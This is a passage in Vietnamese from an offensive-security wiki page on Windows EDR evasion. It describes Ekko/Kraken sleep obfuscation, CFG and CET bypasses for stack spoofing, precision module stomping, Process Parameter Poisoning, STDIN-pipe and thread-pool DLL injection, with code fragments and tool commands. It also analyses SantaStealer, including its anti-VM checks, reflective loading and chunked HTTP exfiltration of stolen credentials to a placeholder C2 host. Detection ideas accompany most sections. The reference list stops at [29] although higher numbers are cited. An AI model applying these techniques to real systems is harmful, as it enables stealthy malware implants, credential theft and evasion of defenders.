- Tạo một **PICO thường trú** (đối tượng PIC bền vững) tiếp tục tồn tại sau khi PIC loader tạm thời tự giải phóng.
- Export hàm `setup_hooks()` để ghi đè import resolver của loader (ví dụ: `funcs.GetProcAddress = _GetProcAddress`).
- Trong `_GetProcAddress`, bỏ qua import theo ordinal và dùng tra cứu hook dựa trên hash như `__resolve_hook(ror13hash(name))`. Nếu có hook, trả về hook đó; nếu không, chuyển tiếp đến `GetProcAddress` thực.
- Đăng ký các mục tiêu hook lúc link bằng các entry Crystal Palace `addhook "MODULE$Func" "hook"`. Hook vẫn hợp lệ vì nằm bên trong PICO thường trú.

Cách này tạo **chuyển hướng IAT lúc import** mà không cần patch phần code của DLL đã nạp sau khi nạp xong.

### Ép tạo import có thể hook khi mục tiêu dùng PEB-walking

Hook lúc import chỉ được kích hoạt nếu hàm thực sự có trong IAT của mục tiêu. Nếu module phân giải API qua PEB-walk + hash (không có import entry), hãy ép tạo một import thực để loader xử lý qua đường `ProcessImports()`:

- Thay việc phân giải export bằng hash (ví dụ: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) bằng tham chiếu trực tiếp như `&WaitForSingleObject`.
- Compiler sẽ tạo một entry IAT, cho phép chặn khi reflective loader phân giải import.

### Obfuscation sleep/idle kiểu Ekko mà không patch `Sleep()`

Thay vì patch `Sleep`, hãy hook các primitive wait/IPC thực tế mà implant sử dụng (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Với các lần chờ dài, bọc lời gọi bằng chuỗi obfuscation kiểu Ekko để mã hóa image trong bộ nhớ khi idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Dùng `CreateTimerQueueTimer` để lên lịch một chuỗi callback gọi `NtContinue` với các frame `CONTEXT` được tạo sẵn.
- Chuỗi điển hình (x64): đặt image thành `PAGE_READWRITE` → mã hóa RC4 qua `advapi32!SystemFunction032` trên toàn bộ image đã map → thực hiện wait dạng blocking → giải mã RC4 → **khôi phục quyền theo từng section** bằng cách duyệt các section PE → báo hiệu hoàn tất.
- `RtlCaptureContext` cung cấp một `CONTEXT` mẫu; sao chép nó thành nhiều frame và đặt các thanh ghi (`Rip/Rcx/Rdx/R8/R9`) để gọi từng bước.

Chi tiết vận hành: trả về “success” cho các lần chờ dài (ví dụ: `WAIT_OBJECT_0`) để caller tiếp tục trong khi image đang được che giấu. Mẫu này ẩn module khỏi scanner trong các khoảng idle và tránh dấu hiệu kinh điển của việc “patch `Sleep()`”.

Ý tưởng phát hiện (dựa trên telemetry)
- Nhiều callback `CreateTimerQueueTimer` liên tiếp trỏ đến `NtContinue`.
- `advapi32!SystemFunction032` được dùng trên các buffer lớn, liên tục, có kích thước tương đương image.
- `VirtualProtect` trên một vùng lớn, sau đó khôi phục quyền tùy chỉnh theo từng section.

### Đăng ký CFG lúc runtime cho gadget sleep-obfuscation

Trên các mục tiêu bật CFG, lần nhảy gián tiếp đầu tiên vào gadget giữa hàm như `jmp [rbx]` hoặc `jmp rdi` thường làm tiến trình crash với `STATUS_STACK_BUFFER_OVERRUN` vì gadget không có trong metadata CFG của module. Để duy trì các chuỗi kiểu Ekko/Kraken bên trong tiến trình được hardening:<sup>[[30]](#references)</sup>

- Đăng ký mọi đích gián tiếp mà chuỗi sử dụng bằng `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` cùng các entry `CFG_CALL_TARGET_VALID`.
- Với địa chỉ nằm trong image đã nạp (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` phải bắt đầu tại **image base** và bao phủ **toàn bộ kích thước image**.
- Với các vùng được map thủ công/PIC/stomp, hãy dùng **allocation base** và kích thước allocation.
- Đánh dấu không chỉ dispatch gadget mà cả các export được gọi gián tiếp (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, các syscall wait/event) và mọi section executable do attacker kiểm soát sẽ trở thành đích gián tiếp.

Cách này biến các chuỗi sleep kiểu ROP/JOP từ “chỉ hoạt động trong tiến trình không bật CFG” thành primitive có thể tái sử dụng cho `explorer.exe`, trình duyệt, `svchost.exe` và các endpoint khác được biên dịch với `/guard:cf`.

### Giả mạo stack an toàn với CET cho thread đang ngủ

Thay thế toàn bộ `CONTEXT` dễ gây chú ý và có thể lỗi trên các hệ thống CET Shadow Stack vì `Rip` giả mạo vẫn phải khớp với shadow stack của phần cứng. Mẫu che giấu khi ngủ an toàn hơn là:<sup>[[30]](#references)</sup>

- Chọn một thread khác trong cùng tiến trình và đọc giới hạn stack `NT_TIB` / TEB (`StackBase`, `StackLimit`) qua `NtQueryInformationThread`.
- Sao lưu TEB/TIB thực của thread hiện tại.
- Chụp context thực của thread đang ngủ bằng `GetThreadContext`.
- Chỉ sao chép `Rip` thực vào context giả mạo, giữ nguyên `Rsp`/trạng thái stack đã giả mạo.
- Trong thời gian ngủ, sao chép `NT_TIB` của thread giả mạo vào TEB hiện tại để stack walker unwind bên trong một vùng stack hợp lệ.
- Sau khi wait kết thúc, khôi phục TIB và thread context ban đầu.

Cách này giữ instruction pointer nhất quán với CET, đồng thời đánh lừa stack walker của EDR vốn tin vào metadata stack của TEB để xác thực quá trình unwind.

### Phương án thay thế dùng APC: Kraken Mask

Nếu dispatch bằng timer queue quá dễ nhận diện, có thể thực hiện cùng chuỗi sleep-encrypt-spoof-restore từ một helper thread đang bị suspend bằng APC đã xếp hàng:<sup>[[27]](#references)</sup>

- Tạo helper thread với `NtTestAlert` làm entrypoint.
- Xếp các frame `CONTEXT`/APC đã chuẩn bị bằng `NtQueueApcThread` và xử lý chúng bằng `NtAlertResumeThread`.
- Lưu trạng thái chuỗi trên heap thay vì stack của helper để tránh làm cạn stack thread mặc định 64 KB.
- Dùng `NtSignalAndWaitForSingleObject` để báo hiệu sự kiện bắt đầu và block một cách nguyên tử.
- Suspend main thread trước khi khôi phục TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) để giảm khoảng thời gian race mà scanner có thể bắt gặp stack mới khôi phục một phần.

Cách này thay dấu hiệu `CreateTimerQueueTimer` + `NtContinue` bằng dấu hiệu helper-thread/APC nhưng vẫn giữ nguyên mục tiêu che giấu bằng RC4 và giả mạo stack.

Ý tưởng phát hiện bổ sung
- `NtSetInformationVirtualMemory` với `VmCfgCallTargetInformation` ngay trước sleep, wait hoặc APC dispatch.
- `GetThreadContext`/`SetThreadContext` được gọi quanh `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` hoặc `ConnectNamedPipe`.
- `NtQueryInformationThread` rồi ghi trực tiếp vào giới hạn stack TEB/TIB của thread hiện tại.
- Chuỗi `NtQueueApcThread`/`NtAlertResumeThread` gián tiếp gọi `SystemFunction032`, `VirtualProtect` hoặc helper khôi phục quyền section.
- Sử dụng lặp lại các chữ ký gadget ngắn như `FF 23` (`jmp [rbx]`) hoặc `FF E7` (`jmp rdi`) làm điểm chuyển hướng dispatch bên trong các module đã ký.


## Precision Module Stomping

Module stomping thực thi payload từ **section `.text` của một DLL đã được map trong tiến trình đích** thay vì cấp phát bộ nhớ executable private dễ nhận biết hoặc nạp một DLL hy sinh mới. Đích ghi đè nên là một **image đã nạp, được hỗ trợ bởi file trên đĩa**, có vùng code đủ chỗ chứa payload mà không làm hỏng các đường thực thi mà tiến trình vẫn cần.<sup>[[1]](#references)[[2]](#references)</sup>

### Chọn mục tiêu đáng tin cậy

Stomping ngây thơ vào các module phổ biến như `uxtheme.dll` hoặc `comctl32.dll` rất mong manh: DLL có thể chưa được nạp trong tiến trình từ xa, và vùng code quá nhỏ sẽ làm tiến trình crash. Quy trình đáng tin cậy hơn:

1. Liệt kê các module của tiến trình đích và giữ lại **danh sách include chỉ gồm tên** của các DLL đã nạp.
2. Build payload trước và ghi lại **kích thước chính xác theo byte**.
3. Quét các DLL ứng viên trên đĩa và so sánh **`.text` `Misc_VirtualSize`** của section PE với kích thước payload. Điều này quan trọng hơn kích thước file vì nó phản ánh kích thước của section executable **khi được map vào bộ nhớ**.
4. Parse **Export Address Table (EAT)** và chọn RVA của một hàm export làm offset bắt đầu stomp.
5. Tính **phạm vi ảnh hưởng**: nếu payload vượt quá ranh giới hàm được chọn, nó sẽ ghi đè các export liền kề được bố trí sau hàm đó trong bộ nhớ.

Các helper recon/lựa chọn thường thấy ngoài thực tế:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Ghi chú vận hành
- Ưu tiên các DLL **đã được nạp** trong tiến trình từ xa để tránh telemetry từ `LoadLibrary`/việc nạp image bất thường.
- Ưu tiên các export mà ứng dụng mục tiêu hiếm khi thực thi; nếu không, các luồng thực thi thông thường có thể chạm vào những byte đã bị stomp trước hoặc sau khi tạo thread.
- Các implant lớn thường cần đổi cách nhúng shellcode từ string literal sang **byte-array/braced initializer** để toàn bộ buffer được biểu diễn chính xác trong mã nguồn injector.

Ý tưởng phát hiện
- Ghi từ xa vào các trang thực thi được backing bởi image (`MEM_IMAGE`, `PAGE_EXECUTE*`) thay vì các vùng cấp phát RWX/RX private phổ biến hơn.
- Các entry point của export có byte trong bộ nhớ không còn khớp với file backing trên đĩa.
- Remote thread hoặc context pivot bắt đầu thực thi bên trong một export DLL hợp lệ có các byte đầu tiên vừa bị sửa đổi.
- Các chuỗi thao tác `VirtualProtect(Ex)` / `WriteProcessMemory` đáng ngờ nhắm vào các trang `.text` của DLL, sau đó tạo thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) là kỹ thuật **process-injection / EDR-evasion** tránh đường ghi từ xa kinh điển (`VirtualAllocEx` + `WriteProcessMemory`). Thay vì sao chép byte vào một tiến trình mục tiêu đang chạy, kỹ thuật này lợi dụng việc Windows **sao chép các tham số khởi chạy `CreateProcessW` được chọn vào tiến trình con** và lưu chúng bên trong `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Các carrier có thể bị poison được `CreateProcessW` sao chép

Các carrier hữu ích gồm:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (với `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Các giới hạn thực tế của carrier:

- `lpCommandLine` phải trỏ đến **vùng nhớ có thể ghi** để `CreateProcessW` sử dụng, và bị giới hạn tối đa **32,767 ký tự Unicode**, tính cả ký tự kết thúc null.
- `lpEnvironment` phải là một khối môi trường Unicode gồm các chuỗi `NAME=VALUE\0` liên tiếp, kết thúc bằng một ký tự `\0` bổ sung.
- `lpReserved` chính thức được dành riêng, vì vậy nên xem ánh xạ `ShellInfo` là chi tiết triển khai thay vì một hợp đồng ổn định được tài liệu hóa.

Cách này biến việc tạo tiến trình thông thường thành **primitive truyền payload**. Operator tạo tiến trình con bằng dữ liệu khởi chạy do attacker kiểm soát và để Windows thực hiện việc sao chép liên tiến trình.

### Luồng tra cứu từ xa không dùng API ghi từ xa

Sau khi tiến trình con được tạo, hãy xác định buffer đã sao chép bằng các primitive **chỉ đọc**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → lấy `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Đọc `PEB` từ xa
3. Lần theo `PEB.ProcessParameters`
4. Đọc `RTL_USER_PROCESS_PARAMETERS`
5. Sử dụng con trỏ đã chọn:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Luồng tối thiểu:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Thực thi vùng đệm tham số đã sao chép

Vùng tham số được sao chép thường có quyền `RW`, không thể thực thi. Một chuỗi P3 phổ biến là:

1. Tạo tiến trình bình thường (không ở trạng thái suspended)
2. Đặt trang tham số đã chọn thành executable bằng `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Tái sử dụng handle của main thread đã được trả về trong `PROCESS_INFORMATION`
4. Chuyển hướng thực thi bằng `NtSetContextThread` (`CONTEXT_CONTROL`, ghi đè `RIP`)

Không giống các workflow thread hijacking cổ điển, cách này **không cần** `SuspendThread` / `ResumeThread`; có thể thay đổi context trực tiếp qua handle main thread được trả về.

Cách này tránh một số API thường được giám sát để phát hiện injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- thường cả `SuspendThread` / `ResumeThread`

### Giới hạn byte null và shellcode theo giai đoạn

Cả ba carrier đều là **dữ liệu dạng chuỗi hoặc tương tự chuỗi**, vì vậy payload thô chứa `0x00` sẽ bị cắt ngắn trong quá trình truyền. Một cách khắc phục thiết thực là dùng **giai đoạn đầu không chứa byte null** để tái tạo các hằng số lúc runtime, sau đó nạp một giai đoạn thứ hai tùy ý.

Một mẫu đơn giản là tổng hợp hằng số dựa trên XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Điều này cho phép stage đầu tiên tạo các chuỗi trên stack, đối số API, đường dẫn DLL hoặc trình nạp shellcode stage thứ hai mà không nhúng byte null vào tham số được truyền đi.

### Các lệnh gọi API dựa trên stack từ stage đầu tiên

Khi stage đầu tiên cần gọi các API như `LoadLibraryA`, nó có thể:

- đẩy chuỗi/buffer lên stack của tiến trình đích
- dành chỗ cho **32-byte x64 shadow space**
- đặt `RCX`, `RDX`, `R8`, `R9` thành các hằng số hoặc con trỏ tương đối với `RSP`
- giữ `RSP` **căn chỉnh 16-byte** trước khi gọi

Sau đó, stage thứ hai có thể được sao chép từ stack vào vùng cấp phát `PAGE_READWRITE`, đổi quyền thành `PAGE_EXECUTE_READ` bằng `VirtualProtect` rồi nhảy tới đó, tránh cấp phát trực tiếp vùng RWX.

### Ý tưởng phát hiện

Các cơ hội hunting tốt được tác giả đề cập:

- `VirtualProtectEx` / `NtProtectVirtualMemory` chuyển **các trang tham số tiến trình thành executable**
- thay đổi quyền này theo sau bởi `SetThreadContext` / `NtSetContextThread`
- đọc từ xa `PEB`, rồi đến `RTL_USER_PROCESS_PARAMETERS`
- các giá trị `lpCommandLine`, `lpEnvironment` hoặc `STARTUPINFO.lpReserved` dài bất thường / có entropy cao trong lúc tạo tiến trình

### Ghi chú

- P3 là một **thủ thuật truyền dữ liệu giữa các tiến trình**, bản thân nó không phải primitive thực thi đầy đủ: tham số được sao chép vẫn cần được đổi quyền thực thi và cần có phương thức chuyển hướng thực thi.
- Các tác giả đã cân nhắc `RtlCreateProcessReflection` / Dirty Vanity nhưng loại bỏ vì bên trong nó gọi đến các primitive đáng ngờ như `NtWriteVirtualMemory` và `NtCreateThreadEx`.

## Tiêm dữ liệu qua pipe STDIN của console

Một tiến trình con console tương tác cũng có thể được dùng làm **primitive truyền payload**. Injector chuyển hướng standard input của tiến trình con sang một pipe rồi gửi marker theo sau là shellcode. Sau khi chương trình console đọc dữ liệu vào bộ nhớ riêng của nó, injector tìm buffer đó, cấp quyền thực thi cho nó và chuyển hướng một thread của tiến trình con đến đó. Cách này tránh dùng `VirtualAllocEx` và `WriteProcessMemory`, nhưng vẫn là process injection chứ không phải một phương thức EDR bypass tổng quát.<sup>[[41]](#references)</sup>

Dù được mô tả là "named-pipe", implementation tham chiếu gọi `CreatePipe`, hàm này tạo một **anonymous pipe**. Windows triển khai anonymous pipe bằng các đối tượng pipe có tên duy nhất ở bên trong, nhưng PoC không chọn đường dẫn `\\.\pipe\<name>` hay gọi `CreateNamedPipe`. Nó tạo các handle có thể kế thừa với security descriptor mặc định, đặt handle đọc vào `STARTUPINFO.hStdInput`, đặt `STARTF_USESTDHANDLES` rồi khởi chạy một tiến trình con mới với tính năng kế thừa handle được bật. Vì vậy, PoC này khởi chạy console executable được cung cấp; nó không gắn pipe vào một tiến trình đang tồn tại.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Quy trình tham chiếu

Implementation sử dụng chuỗi thao tác sau:<sup>[[41]](#references)</sup>

1. Tạo các cặp anonymous pipe cho `STDIN` và `STDOUT` của tiến trình con. Tắt tính năng kế thừa trên hai handle phía tiến trình cha và đóng các bản sao handle phía tiến trình con trong tiến trình cha sau khi tạo tiến trình.
2. Khởi chạy một executable tương tác như `netsh.exe` hoặc `nslookup.exe` với `CREATE_NEW_CONSOLE`. Tiến trình con kế thừa các standard handle đã được chuyển hướng.
3. Gửi toàn bộ mảng nhị phân `rawData` bằng `WriteFile` qua handle `STDIN` phía tiến trình cha. Chương trình console đọc các byte và để lại một bản sao trong một trong các vùng committed riêng của nó.
4. Duyệt không gian địa chỉ của tiến trình con bằng `VirtualQueryEx`, đọc các vùng `MEM_PRIVATE` tiềm năng bằng `ReadProcessMemory` và tìm marker ở đầu `rawData`.
5. Đổi quyền của buffer được phát hiện thành `PAGE_EXECUTE_READWRITE` bằng `VirtualProtectEx`.
6. Xác định main thread, tạm dừng thread đó, đặt `RIP` thành `found_address + 0x19` bằng `NtSetContextThread` rồi tiếp tục thread.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Triển khai được cung cấp chỉ dành cho x64: nó sửa đổi `CONTEXT.Rip`, và payload nhúng bên trong là shellcode x64. `rawData` bắt đầu bằng marker dài 25 byte, vì vậy byte thực thi bắt đầu tại offset thập lục phân `0x19`. Khi thay payload, hãy giữ nguyên bố cục đó hoặc cập nhật đồng bộ marker, vector tìm kiếm, kích thước mảng và offset thực thi. Các chú thích trong mã nguồn cũng liệt kê `0x0A`, `0x0D` và `0x1A` là ký tự cấm. Quy trình này không thay đổi token hay quyền của tiến trình con.<sup>[[41]](#references)</sup>

Để xem các helper native nhỏ và mẫu biên dịch payload, hãy tham khảo [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## DLL injection qua callback thread-pool không dùng shellcode (DLLParty)

DLLParty điều chỉnh kỹ thuật injection thread-pool kiểu PoolParty để khiến một worker hiện có của tiến trình đích gọi `LoadLibraryA`, thay vì thực thi một callback stub được inject. Primitive dispatch của nó là một completion `TP_DIRECT` được đưa vào I/O completion port của pool đích. Cách này không vượt qua quyền truy cập tiến trình: PoC gọi `OpenProcess(PROCESS_ALL_ACCESS)` và cần quyền đọc/ghi bộ nhớ của tiến trình đích cùng các handle worker-factory và completion-port có thể được duplicate.<sup>[[46]](#references)[[47]](#references)</sup>

Trên Windows x64, worker truyền con trỏ tới `TP_CALLBACK_INSTANCE` nằm trên stack của nó qua `RCX`, đối số callback đầu tiên. `LoadLibraryA` diễn giải chính con trỏ đó thành `LPCSTR`. Trong đường thực thi đã kiểm thử, `TppWorkerThread` tạo con trỏ tại `RSP+0x178`, trong khi thao tác ghi thông thường đầu tiên vào đối tượng này nằm tại `RSP+0x1d0`. Vì vậy, đường dẫn DLL kết thúc bằng null và vừa trong 0x58 byte đầu có thể được đặt ở đầu instance mà không bị ghi đè trước khi dispatch. Đây là quan sát chỉ áp dụng cho một bản build cụ thể, không phải bảo đảm ABI được Windows tài liệu hóa.<sup>[[46]](#references)[[47]](#references)</sup>

Quy trình tham khảo:<sup>[[46]](#references)[[47]](#references)</sup>

1. Liệt kê các handle của tiến trình đích bằng `NtQuerySystemInformation(SystemHandleInformation)` và xác định `TpWorkerFactory` bằng cách truy vấn loại đối tượng. Duplicate một handle worker-factory rồi truy vấn `WorkerFactoryBasicInformation`; `StartParameter` cung cấp `TP_POOL` từ xa. Bỏ qua các factory có `TotalWorkerCount == 0`.
2. Đọc `TP_POOL.CompletionPort` và duyệt danh sách worker riêng của pool. Trên bản build Windows 10 19045 x64 đã kiểm thử (`ntdll.dll 10.0.19041.4842`), phần đầu danh sách nằm tại `pool+0x60`; mỗi liên kết nằm tại `worker+0x10`, do đó slot callback-instance tại `worker+0x38` tương ứng với `link+0x28`. PoC kiểm tra căn chỉnh con trỏ, tính đối ứng của liên kết, quyền sở hữu pool, thread ID khác 0, node lặp và phần đầu danh sách ổn định.
3. Ghi đường dẫn DLL vào **mọi** slot worker tìm được vì completion được đưa vào hàng đợi có thể được worker bất kỳ xử lý. Đặt một `TP_DIRECT` có `Callback = LoadLibraryA` trong bộ nhớ ghi được của tiến trình đích. PoC dùng `last_slot-0x500` trên stack của worker thay vì `VirtualAllocEx`; offset này dựa trên thử nghiệm và không được ghi đè dữ liệu stack đang hoạt động.
4. Duplicate handle completion-port của tiến trình đích rồi gọi `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Địa chỉ `TP_DIRECT` từ xa là completion key. Sau đó, một worker hiện có gọi `LoadLibraryA` với con trỏ callback-instance đã bị ghi đè, nạp một DLL mà tiến trình đích có thể truy cập.

PoC nhận PID tiến trình đích (`DLLParty.exe <target_pid>`) và dùng đường dẫn DLL được hard-code trong `DLLParty.cpp`; hãy đặt một đường dẫn mà tiến trình đích có thể truy cập trước khi build executable x64. PoC cũng dùng địa chỉ `LoadLibraryA` của chính tiến trình chạy nó làm callback từ xa, nên giả định địa chỉ đó hợp lệ trong tiến trình đích. Mã không kiểm tra độ dài đường dẫn so với phần 0x58 byte hoặc xác nhận rằng việc duyệt worker đã tìm được slot trước khi truy cập phần tử cuối. Hãy xác minh lại các offset riêng, bố cục stack và vùng nhớ ghi được cho bản build đích. Việc không dùng `CreateRemoteThreadEx`, shellcode và `VirtualAllocEx` không loại bỏ thao tác ghi xuyên tiến trình hoặc telemetry về nạp DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Kỹ thuật của SantaStealer nhằm né tránh không lưu tệp và đánh cắp thông tin xác thực

SantaStealer (còn gọi là BluelineStealer) cho thấy các info-stealer hiện đại kết hợp AV bypass, anti-analysis và truy cập thông tin xác thực trong cùng một quy trình như thế nào.<sup>[[24]](#references)</sup>

### Kiểm tra bố cục bàn phím và trì hoãn trong sandbox

- Một cờ cấu hình (`anti_cis`) liệt kê các bố cục bàn phím đã cài đặt qua `GetKeyboardLayoutList`. Nếu tìm thấy bố cục chữ Cyrillic, mẫu tạo một marker `CIS` rỗng rồi kết thúc trước khi chạy các stealer, nhờ đó không kích hoạt tại những khu vực bị loại trừ nhưng vẫn để lại dấu vết phục vụ việc săn tìm.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Logic `check_antivm` nhiều lớp

- Variant A duyệt danh sách process, băm từng tên bằng checksum cuốn tùy chỉnh rồi so sánh với các blocklist nhúng dành cho debugger/sandbox; sau đó lặp lại checksum với tên máy tính và kiểm tra các thư mục làm việc như `C:\analysis`.
- Variant B kiểm tra các thuộc tính hệ thống (ngưỡng tối thiểu của số process, thời gian uptime gần đây), gọi `OpenServiceA("VBoxGuest")` để phát hiện VirtualBox additions và thực hiện kiểm tra thời gian quanh các lệnh sleep để nhận biết thao tác single-stepping. Nếu phát hiện bất kỳ dấu hiệu nào, chương trình sẽ dừng trước khi các module khởi chạy.

### Helper fileless + reflective loading kép bằng ChaCha20

- DLL/EXE chính nhúng một helper lấy thông tin đăng nhập Chromium; helper này được ghi xuống đĩa hoặc được ánh xạ thủ công vào bộ nhớ. Ở chế độ fileless, helper tự phân giải imports/relocations để không ghi bất kỳ artifact nào xuống đĩa.
- Helper lưu một DLL giai đoạn hai được mã hóa hai lần bằng ChaCha20 (hai khóa 32 byte + nonce 12 byte). Sau cả hai lượt giải mã, nó reflective load blob (không dùng `LoadLibrary`) rồi gọi các export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` có nguồn gốc từ [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Các routine ChromElevator dùng process hollowing reflective bằng direct syscall để inject vào một trình duyệt Chromium đang chạy, kế thừa các khóa AppBound Encryption và giải mã mật khẩu/cookie/thẻ tín dụng trực tiếp từ cơ sở dữ liệu SQLite, bất chấp các biện pháp hardening ABE.

### Thu thập trong bộ nhớ theo module & exfil HTTP chia khối

- `create_memory_based_log` duyệt bảng function pointer toàn cục `memory_generators` và tạo một thread cho mỗi module được bật (Telegram, Discord, Steam, ảnh chụp màn hình, tài liệu, tiện ích mở rộng trình duyệt, v.v.). Mỗi thread ghi kết quả vào các buffer dùng chung và báo số lượng file sau khoảng 45 giây chờ join.
- Khi hoàn tất, toàn bộ dữ liệu được nén thành `%TEMP%\\Log.zip` bằng thư viện `miniz` được liên kết tĩnh. `ThreadPayload1` sau đó sleep 15 giây rồi truyền archive theo các khối 10 MB qua HTTP POST tới `http://<C2>:6767/upload`, giả mạo boundary của trình duyệt `multipart/form-data` (`----WebKitFormBoundary***`). Mỗi khối thêm `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` nếu có; khối cuối cùng thêm `complete: true` để C2 biết quá trình ghép lại đã hoàn tất.

## References

- [1] [Nghệ thuật né tránh nâng cao: Module Stomping chính xác](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack: không còn vùng an toàn miễn phí cho malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – tài liệu](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – ví dụ](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – ví dụ](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC giả mạo call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Chuỗi lây nhiễm mới và kỹ thuật làm rối dựa trên ConfuserEx của DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Có nên tin vào zero trust của bạn? Vượt qua kiểm tra trạng thái thiết bị của Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Trước ToolShell: Khám phá các hoạt động ransomware trước đây của Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Lạm dụng các export được chuyển tiếp](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Danh mục Forwarded Exports của Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Thứ tự tìm kiếm dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Quyền bảo mật và quyền truy cập của process](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Tài liệu tham khảo EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Trình khởi chạy CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Đối phó với EDR nhờ Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Phá vỡ lớp bảo vệ của Windows Defender bằng kỹ thuật chuyển hướng thư mục](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Tài liệu tham khảo lệnh mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Đằng sau tấm màn Pure: Từ RAT đến builder rồi coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer sắp đến: Một infostealer mới đầy tham vọng](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Giải mã Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Vô hiệu hóa malware Node.js bằng API tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Người đẹp ngủ trong rừng: Đưa Adaptix vào trạng thái ngủ bằng Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Đầu độc tham số process](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
